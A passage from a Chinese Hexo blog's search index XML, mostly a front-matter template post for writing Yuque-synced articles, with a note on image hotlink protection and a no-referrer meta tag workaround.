CDN 厂商同理）</li></ul><p><a href="https://help.aliyun.com/knowledge_detail/148179.html" target="_blank" rel="noopener">参考连接</a></p>]]></content>
    
    
    <categories>
      
      <category>博客维护</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUGs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>语雀Front-matter-demo</title>
    <link href="/posts/1001/"/>
    <url>/posts/1001/</url>
    
    <content type="html"><![CDATA[<p>这是一个模板,方便在语雀中快速编写符合 Yuque-Hexo 语法得文章,按照该模板即可保证文章格式。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: 语雀Front-matter-demo for Fluid<br>banner_img: https://raw.githubusercontent.com/0x7b/CDN/master/img/20210123212934.png<br>sticky: 2<br>date: 2020-12-18<br>updated: 2020-1-23<br>tags: [Hexo, 运营]<br>categories: [博客维护]<br>keywords: "Hexo,运营"<br>toc: True<br>abbrlink: 1001<br>excerpt: 这是一个模板,方便在语雀中快速编写符合Yuque-Hexo语法得文章,按照该模板即可保证文章格式。<br>hide: false<br>---<br></code></pre></td></tr></table></figure><p>引入外部图片测试（语雀）<br><a href="https://cdn.jsdelivr.net/gh/0x7b/CDN/img/65033404_p0.jpg" target="_blank" rel="noopener"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/8398873/1608800119701-0aee20c6-8ea4-4ca2-959d-55ad5078c77c.jpeg#height=1414&id=qpf7S&originHeight=1414&originWidth=2000&originalType=binary&size=0&status=done&style=none&width=2000" srcset="/img/loading.gif" lazyload alt=""></a><br>目前看来还是会受防盗链的影响，<br><a href="https://github.com/x-cold/yuque-hexo/issues/41" target="_blank" rel="noopener">解决办法</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"referrer"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"no-referrer"</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>可直接在语雀中添加，即可为这篇文章 no-referrer 属性<br>但这个解决方法也具有局限性：只能在 Chrome 浏览器中生效</p>]]></content>
    
    
    <categories>
      
      <category>博客维护</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>运营</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
